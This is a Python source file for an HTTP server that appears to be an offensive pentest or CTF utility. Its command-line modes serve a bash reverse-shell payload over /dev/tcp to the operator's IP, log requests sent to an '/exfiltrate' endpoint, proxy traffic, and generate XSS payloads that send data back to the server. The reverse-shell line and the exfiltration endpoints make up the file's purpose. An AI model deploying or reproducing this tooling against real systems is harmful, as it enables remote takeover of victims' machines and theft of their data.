#!/usr/bin/env python

from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse
import threading
import requests
import sys
import os
import ssl
import util
import xss_handler

class FileServerRequestHandler(BaseHTTPRequestHandler):

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)

    def do_HEAD(self):
        self.do_GET()

    def do_POST(self):
        self.do_GET()

    def onForward(self, base_path, target):
        path = self.path[max(0, len(base_path)-1):]
        parts = urlparse(target)
        if path.startswith(parts.path):
            path = path[len(parts.path):]

        target_rewrite = target + path

        # queryStr = "" if "?" not in self.path else self.path[self.path.index("?")+1:]
        # if queryStr:
        #     target += "?" if "?" not in target else "&"
        #     target += queryStr

        contentLength = self.headers.get('Content-Length')
        data = None

        if contentLength and int(contentLength) > 0:
            data = self.rfile.read(int(contentLength))

        method = self.command
        print(target, "=>", method, target_rewrite)
        res = requests.request(method, target_rewrite, headers=self.headers, data=data)
        return res.status_code, res.content, res.headers


    def find_route(self, path):

        if path in self.server.routes:
            return self.server.routes[path]

        for p, route in self.server.prefix_routes.items():
            if path.startswith(p):
                return route

        def not_found(req):
            return 404, b"", {}

        return not_found

    def do_OPTIONS(self):
        self.do_GET()

    def do_GET(self):

        path = self.server.cleanPath(self.path)
        route = self.find_route(path)
        result = route(self)

        blacklist_headers = ["transfer-encoding", "content-length", "content-encoding", "allow", "connection"]
        status_code = 200 if len(result) < 1 else result[0]
        data        = b"" if len(result) < 2 else result[1]
        headers     = { } if len(result) < 3 else result[2]

        self.log_request(status_code)
        self.send_response_only(status_code)

        for key, value in headers.items():
            if key.lower() not in blacklist_headers:
                self.send_header(key, value)

        if self.command.upper() == "OPTIONS":
            self.send_header("Allow", "OPTIONS, GET, HEAD, POST")

        self.end_headers()

        if data and self.command.upper() not in ["HEAD","OPTIONS"]:
            self.wfile.write(data)

        if path in self.server.dumpRequests:
            contentLength = self.headers.get('Content-Length')
            body = None

            if contentLength and int(contentLength) > 0:
                body = self.rfile.read(int(contentLength))

            print("==========")
            print("%s %s %s" % (self.command, self.path, self.request_version))
            print(str(self.headers).strip())
            if body:
                print()
                print(body)
            print("==========")

    def log_message(self, format, *args):
        if self.server.logRequests:
            super().log_message(format, *args)

class HttpFileServer(HTTPServer):
    def __init__(self, addr, port):
        super().__init__((addr, port), FileServerRequestHandler)
        self.logRequests = False
        self.routes = { }
        self.dumpRequests = []
        self.prefix_routes = { }
        self.is_running = True

    def cleanPath(self, path):

        if "?" in path:
            path = path[0:path.find("?")]

        if not path.startswith("/"):
            path = "/" + path

        return path.strip()

    def addFile(self, name, data):
        if isinstance(data, str):
            data = data.encode("UTF-8")

        # return 200 - OK and data
        self.addRoute(name, lambda req: (200, data))

    def dumpRequest(self, name):
        self.dumpRequests.append(self.cleanPath(name))

    def addRoute(self, path, func):
        self.routes[self.cleanPath(path)] = func

    def addPrefixRoute(self, path, func):
        self.prefix_routes[self.cleanPath(path)] = func

    def forwardRequest(self, path, target):
        self.addPrefixRoute(path, lambda req: req.onForward(path, target))

    def enableLogging(self):
        self.logRequests = True

    def enableSSL(self, keyFile=None, certFile=None):
        if keyFile is None:
            print("Generating certificate…")
            os.system("openssl req -new -x509 -keyout private.key -out server.crt -days 365 -nodes")
            certFile = "server.crt"
            keyFile = "private.key"

        self.socket = ssl.wrap_socket(self.socket,
            server_side=True,
            certfile=certFile,
            keyfile=keyFile,
            ssl_version=ssl.PROTOCOL_TLS,
            cert_reqs=ssl.CERT_NONE)

        # try:
        #     ssl._create_default_https_context = ssl._create_unverified_context
        # except AttributeError:
        #     print("Legacy Python that doesn't verify HTTPS certificates by default")
        #     pass

    def startBackground(self):
        t = threading.Thread(target=self.serve_forever)
        t.start()
        return t

    def start(self):
        return self.serve_forever()

    def stop(self):
        self.is_running = False

    def serve_forever(self):
        while self.is_running:
            self.handle_request()


if __name__ == "__main__":
    if len(sys.argv) < 2 or sys.argv[1] not in ["shell","dump","proxy","xss"]:
        print("Usage: %s [shell,dump,proxy,xss]" % sys.argv[0])
        exit(1)

    httpPort = 80
    fileServer = HttpFileServer("0.0.0.0", httpPort)
    ipAddress = util.getAddress()

    if sys.argv[1] == "shell":
        listenPort = 4444 if len(sys.argv) < 3 else int(sys.argv[2])
        rev_shell = "bash -i >& /dev/tcp/%s/%d 0>&1" % (ipAddress, listenPort)
        fileServer.addFile("shell.sh", rev_shell)
        print("Reverse Shell URL: http://%s/shell.sh" % ipAddress)
    elif sys.argv[1] == "dump":
        fileServer.dumpRequest("/exfiltrate")
        print("Exfiltrate data using: http://%s/exfiltrate" % ipAddress)
    elif sys.argv[1] == "proxy":
        url = "https://google.com" if len(sys.argv) < 3 else sys.argv[2]
        fileServer.forwardRequest("/proxy", url)
        print("Exfiltrate data using: http://%s/proxy" % ipAddress)
    elif sys.argv[1]  == "xss":
        type = "img" if len(sys.argv) < 3 else sys.argv[2]
        xss = xss_handler.generatePayload(type, ipAddress, httpPort)
        print("Exfiltrate data using:")
        print(xss)

    fileServer.start()
